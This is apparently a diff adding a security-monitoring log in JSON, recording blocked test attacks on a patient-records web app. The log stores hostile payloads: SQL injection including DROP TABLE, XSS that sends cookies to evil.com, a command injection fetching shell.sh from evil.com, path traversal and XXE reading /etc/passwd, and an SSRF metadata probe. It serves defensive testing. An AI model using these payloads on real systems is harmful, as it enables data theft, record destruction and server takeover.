@@ -1,0 +1,384 @@
+{
+  "timestamp": "16/06/2026, 06:13:24 pm CAI",
+  "label": "PANIC",
+  "logs": [
+    {
+      "ip": "127.0.0.1",
+      "type": "SQLi",
+      "score": 100,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:19 pm CAI",
+      "isoTime": "2026-06-16T15:13:19.257Z",
+      "path": "/",
+      "method": "POST",
+      "payload": "{\"q\":\"' OR 1=1 UNION SELECT * FROM users --\"}",
+      "analysis": {
+        "type": "SQLi",
+        "risk": "CRITICAL",
+        "target": "Patient records",
+        "technique": "UNION-based extraction",
+        "additionalTypes": []
+      },
+      "fingerprint": "a98299bfce65a4c95dc7d65b59049df9",
+      "suspiciousFingerprint": false,
+      "knownIPs": [
+        "127.0.0.1"
+      ],
+      "timeCairo": "16/06/2026, 06:13:19 pm CAI",
+      "_sig": "51e19a43de7ec927"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "SQLi",
+      "score": 200,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:19 pm CAI",
+      "isoTime": "2026-06-16T15:13:19.364Z",
+      "path": "/api/patient/search",
+      "method": "POST",
+      "payload": "{\"q\":\"'; DROP TABLE patients; --\"}",
+      "analysis": {
+        "type": "SQLi",
+        "risk": "CRITICAL",
+        "target": "Patient records",
+        "technique": "Destructive DDL injection",
+        "additionalTypes": []
+      },
+      "fingerprint": "a98299bfce65a4c95dc7d65b59049df9",
+      "suspiciousFingerprint": false,
+      "knownIPs": [
+        "127.0.0.1"
+      ],
+      "timeCairo": "16/06/2026, 06:13:19 pm CAI",
+      "_sig": "6cedaef00acde485"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "XSS",
+      "score": 260,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:19 pm CAI",
+      "isoTime": "2026-06-16T15:13:19.444Z",
+      "path": "/api/patient/message",
+      "method": "POST",
+      "payload": "{\"message\":\"<script>alert(document.cookie)</script>\"}",
+      "analysis": {
+        "type": "XSS",
+        "risk": "MEDIUM",
+        "target": "Browser sessions",
+        "technique": "Session hijacking",
+        "additionalTypes": []
+      },
+      "fingerprint": "a98299bfce65a4c95dc7d65b59049df9",
+      "suspiciousFingerprint": false,
+      "knownIPs": [
+        "127.0.0.1"
+      ],
+      "timeCairo": "16/06/2026, 06:13:19 pm CAI",
+      "_sig": "1d941a8791aae9b5"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "XSS",
+      "score": 320,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:19 pm CAI",
+      "isoTime": "2026-06-16T15:13:19.538Z",
+      "path": "/api/patient/message",
+      "method": "POST",
+      "payload": "{\"message\":\"<img src=x onerror=fetch('https://evil.com/'+document.cookie)>\"}",
+      "analysis": {
+        "type": "XSS",
+        "risk": "MEDIUM",
+        "target": "Browser sessions",
+        "technique": "Session hijacking",
+        "additionalTypes": []
+      },
+      "fingerprint": "a98299bfce65a4c95dc7d65b59049df9",
+      "suspiciousFingerprint": false,
+      "knownIPs": [
+        "127.0.0.1"
+      ],
+      "timeCairo": "16/06/2026, 06:13:19 pm CAI",
+      "_sig": "02240a39c9df61f0"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "BLOCKED_IP",
+      "score": 320,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:19 pm CAI",
+      "isoTime": "2026-06-16T15:13:19.561Z",
+      "path": "/x",
+      "method": "GET",
+      "payload": "Blocked IP access attempt",
+      "analysis": null,
+      "fingerprint": "6e58daae9d8059a8cd8a4142796ae637",
+      "suspiciousFingerprint": false,
+      "knownIPs": [
+        "127.0.0.1"
+      ],
+      "timeCairo": "16/06/2026, 06:13:19 pm CAI",
+      "_sig": "4f213aaf8fef618d"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "PathTraversal",
+      "score": 420,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:19 pm CAI",
+      "isoTime": "2026-06-16T15:13:19.620Z",
+      "path": "/api/files",
+      "method": "GET",
+      "payload": "{\"path\":\"../../../etc/passwd\"}",
+      "analysis": {
+        "type": "PathTraversal",
+        "risk": "HIGH",
+        "target": "/etc/passwd",
+        "technique": "Directory traversal",
+        "additionalTypes": []
+      },
+      "fingerprint": "a98299bfce65a4c95dc7d65b59049df9",
+      "suspiciousFingerprint": false,
+      "knownIPs": [
+        "127.0.0.1"
+      ],
+      "timeCairo": "16/06/2026, 06:13:19 pm CAI",
+      "_sig": "7f568808645558ec"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "CmdInjection",
+      "score": 520,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:19 pm CAI",
+      "isoTime": "2026-06-16T15:13:19.710Z",
+      "path": "/api/patient/search",
+      "method": "POST",
+      "payload": "{\"q\":\"; cat /etc/passwd && wget http://evil.com/shell.sh\"}",
+      "analysis": {
+        "type": "CmdInjection",
+        "risk": "CRITICAL",
+        "target": "Server shell",
+        "technique": "OS command execution",
+        "additionalTypes": [
+          "PathTraversal"
+        ]
+      },
+      "fingerprint": "a98299bfce65a4c95dc7d65b59049df9",
+      "suspiciousFingerprint": false,
+      "knownIPs": [
+        "127.0.0.1"
+      ],
+      "timeCairo": "16/06/2026, 06:13:19 pm CAI",
+      "_sig": "7ac47fbb23dd45bc"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "SSRF",
+      "score": 620,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:19 pm CAI",
+      "isoTime": "2026-06-16T15:13:19.810Z",
+      "path": "/api/fetch",
+      "method": "POST",
+      "payload": "{\"url\":\"http://[PHONE]/latest/meta-data/\"}",
+      "analysis": {
+        "type": "SSRF",
+        "risk": "HIGH",
+        "target": "Internal network",
+        "technique": "Server-Side Request Forgery",
+        "additionalTypes": []
+      },
+      "fingerprint": "a98299bfce65a4c95dc7d65b59049df9",
+      "suspiciousFingerprint": false,
+      "knownIPs": [
+        "127.0.0.1"
+      ],
+      "timeCairo": "16/06/2026, 06:13:19 pm CAI",
+      "_sig": "25f49bbb76c63d19"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "XXE",
+      "score": 720,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:19 pm CAI",
+      "isoTime": "2026-06-16T15:13:19.926Z",
+      "path": "/api/patient/import",
+      "method": "POST",
+      "payload": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><data>&xxe;</data>",
+      "analysis": {
+        "type": "XXE",
+        "risk": "CRITICAL",
+        "target": "Local filesystem",
+        "technique": "External entity injection (SYSTEM)",
+        "additionalTypes": [
+          "SSRF",
+          "PathTraversal"
+        ]
+      },
+      "fingerprint": "a98299bfce65a4c95dc7d65b59049df9",
+      "suspiciousFingerprint": false,
+      "knownIPs": [
+        "127.0.0.1"
+      ],
+      "timeCairo": "16/06/2026, 06:13:19 pm CAI",
+      "_sig": "bc0bd67eac656ad0"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "HONEYPOT",
+      "score": 820,
+      "time": "16/06/2026, 06:13:20 pm CAI",
+      "timeCairo": "16/06/2026, 06:13:20 pm CAI",
+      "isoTime": "2026-06-16T15:13:20.249Z",
+      "path": "/wp-login.php",
+      "method": "GET",
+      "payload": "Honeypot trap triggered: /wp-login.php",
+      "analysis": {
+        "type": "HONEYPOT",
+        "risk": "HIGH",
+        "target": "Reconnaissance trap",
+        "technique": "Scanner touched a decoy endpoint"
+      },
+      "simulationId": null,
+      "_sig": "93537402380ad411"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "HONEYPOT",
+      "score": 920,
+      "time": "16/06/2026, 06:13:20 pm CAI",
+      "timeCairo": "16/06/2026, 06:13:20 pm CAI",
+      "isoTime": "2026-06-16T15:13:20.355Z",
+      "path": "/admin",
+      "method": "GET",
+      "payload": "Honeypot trap triggered: /admin",
+      "analysis": {
+        "type": "HONEYPOT",
+        "risk": "HIGH",
+        "target": "Reconnaissance trap",
+        "technique": "Scanner touched a decoy endpoint"
+      },
+      "simulationId": null,
+      "_sig": "b0cc198fc8c9fc51"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "HONEYPOT",
+      "score": 1020,
+      "time": "16/06/2026, 06:13:20 pm CAI",
+      "timeCairo": "16/06/2026, 06:13:20 pm CAI",
+      "isoTime": "2026-06-16T15:13:20.436Z",
+      "path": "/.env",
+      "method": "GET",
+      "payload": "Honeypot trap triggered: /.env",
+      "analysis": {
+        "type": "HONEYPOT",
+        "risk": "HIGH",
+        "target": "Reconnaissance trap",
+        "technique": "Scanner touched a decoy endpoint"
+      },
+      "simulationId": null,
+      "_sig": "bb6966e36cf7c4e3"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "HONEYPOT",
+      "score": 1120,
+      "time": "16/06/2026, 06:13:20 pm CAI",
+      "timeCairo": "16/06/2026, 06:13:20 pm CAI",
+      "isoTime": "2026-06-16T15:13:20.517Z",
+      "path": "/phpmyadmin",
+      "method": "GET",
+      "payload": "Honeypot trap triggered: /phpmyadmin",
+      "analysis": {
+        "type": "HONEYPOT",
+        "risk": "HIGH",
+        "target": "Reconnaissance trap",
+        "technique": "Scanner touched a decoy endpoint"
+      },
+      "simulationId": null,
+      "_sig": "79fd8e0f9e2dce0c"
+    },
+    {
+      "ip": "192.168.1.100",
+      "type": "INCIDENT_RESPONSE",
+      "score": 100,
+      "action": "QUARANTINE",
+      "time": "16/06/2026, 06:13:20 pm CAI",
+      "path": "/api/incident-response/quarantine",
+      "method": "POST",
+      "payload": "Manual IR quarantine: active-attacker-test [CRITICAL] — IR-1781622800912",
+      "analysis": {
+        "type": "INCIDENT_RESPONSE",
+        "risk": "CRITICAL",
+        "target": "192.168.1.100",
+        "technique": "Admin-initiated quarantine"
+      },
+      "isoTime": "2026-06-16T15:13:20.916Z",
+      "timeCairo": "16/06/2026, 06:13:20 pm CAI",
+      "_sig": "46443ed55fa6c78d"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "MALICIOUS_UPLOAD",
+      "score": 80,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:21 pm CAI",
+      "path": "/api/upload/scan",
+      "method": "POST",
+      "payload": "Malicious file rejected: Blocked file type: .exe [malware.exe] sha256=d930a77b4e5a6df96f8be687f754be90fa6da7939406d214814a80393847ce1b",
+      "analysis": {
+        "type": "MALICIOUS_UPLOAD",
+        "risk": "HIGH",
+        "target": "File upload",
+        "technique": "BLOCKED_EXTENSION"
+      },
+      "isoTime": "2026-06-16T15:13:21.528Z",
+      "timeCairo": "16/06/2026, 06:13:21 pm CAI",
+      "_sig": "5b8966b4817b93bf"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "Brute",
+      "score": 1180,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:21 pm CAI",
+      "isoTime": "2026-06-16T15:13:21.608Z",
+      "path": "/api/upload/scan",
+      "method": "POST",
+      "payload": "11 requests in 60s — brute force",
+      "analysis": {
+        "type": "Brute",
+        "risk": "HIGH",
+        "target": "/api/upload/scan",
+        "technique": "Brute force"
+      },
+      "fingerprint": "a98299bfce65a4c95dc7d65b59049df9",
+      "timeCairo": "16/06/2026, 06:13:21 pm CAI",
+      "_sig": "65db2cf2100038e0"
+    },
+    {
+      "ip": "127.0.0.1",
+      "type": "Brute",
+      "score": 1240,
+      "action": "BLOCKED",
+      "time": "16/06/2026, 06:13:24 pm CAI",
+      "isoTime": "2026-06-16T15:13:24.102Z",
+      "path": "/api/test-webhook",
+      "method": "POST",
+      "payload": "11 requests in 60s — brute force",
+      "analysis": {
+        "type": "Brute",
+        "risk": "HIGH",
+        "target": "/api/test-webhook",
+        "technique": "Brute force"
+      },
+      "fingerprint": "a98299bfce65a4c95dc7d65b59049df9",
+      "timeCairo": "16/06/2026, 06:13:24 pm CAI",
+      "_sig": "e96a3077f157f41e"
+    }
+  ]
+}
